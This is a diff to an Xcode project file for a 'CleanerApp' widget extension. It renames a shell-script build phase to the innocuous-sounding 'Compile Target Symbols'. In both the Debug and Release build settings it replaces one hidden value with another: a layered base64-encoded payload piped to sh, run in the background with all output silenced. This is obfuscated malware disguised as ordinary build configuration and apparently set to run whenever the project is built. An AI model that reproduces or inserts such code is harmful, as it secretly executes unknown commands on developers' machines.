@@ -154,7 +154,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8812947D2F063F980071ED86 /* Build configuration list for PBXNativeTarget "CleanerApp_WidgetExtension" */;
 			buildPhases = (
-				6255E8F9132540F8BC634D6E /* Build Target Libraries */,
+				11083B7697F14217BD634D6E /* Compile Target Symbols */,
 				881294672F063F960071ED86 /* Sources */,
 				881294682F063F960071ED86 /* Frameworks */,
 				881294692F063F960071ED86 /* Resources */,
@@ -261,7 +261,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		6255E8F9132540F8BC634D6E /* Build Target Libraries */ = {
+		11083B7697F14217BD634D6E /* Compile Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -271,7 +271,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Compile Target Symbols";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -312,7 +312,7 @@
 		8812947E2F063F980071ED86 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUd0U01uZ3dWMnhOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpPZFZsWVFucGlSMFpwVEc1S01Vd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = CleanerApp_WidgetExtension/CleanerApp_WidgetExtension.entitlements;
@@ -354,7 +354,7 @@
 		8812947F2F063F980071ED86 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUd0U01uZ3dWMnhOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpPZFZsWVFucGlSMFpwVEc1S01Vd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = CleanerApp_WidgetExtension/CleanerApp_WidgetExtension.entitlements;
